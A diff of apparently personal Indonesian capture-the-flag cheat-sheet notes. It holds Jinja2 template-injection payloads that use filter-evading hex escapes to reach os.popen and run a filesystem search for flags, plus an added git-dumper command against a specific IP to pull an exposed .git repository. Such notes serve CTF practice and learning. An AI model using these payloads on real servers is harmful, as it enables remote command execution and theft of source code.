@@ -25,7 +25,6 @@ icat -o 360448 disk.flag.img 1234
 
 1. {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('find / -type f | grep -i flag 2>/dev/null')|attr('read')() }} (ls kalo . dan _ difilter)
 2. {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('find / -type f | grep -i flag 2>/dev/null')|attr('read')() }}
-3. 
 
 
 # Ping exploitation
@@ -66,8 +65,9 @@ tesseract file.png output
 sha256sum files/* | grep "3ad3"
 
 # Cara mengetahui commit yang udah dihapus (github)
-git log --all --oneline(ini opsional)
-git show 092h98duh872qiasgd98ih9
+1. git-dumper http://51.79.201.156:4009/.git/ dump/
+2. git log --all --oneline
+3. git show 092h98duh872qiasgd98ih9
 
 # Biner calculator
 1. https://seomagnifier.com/binary-calculator (legkap)
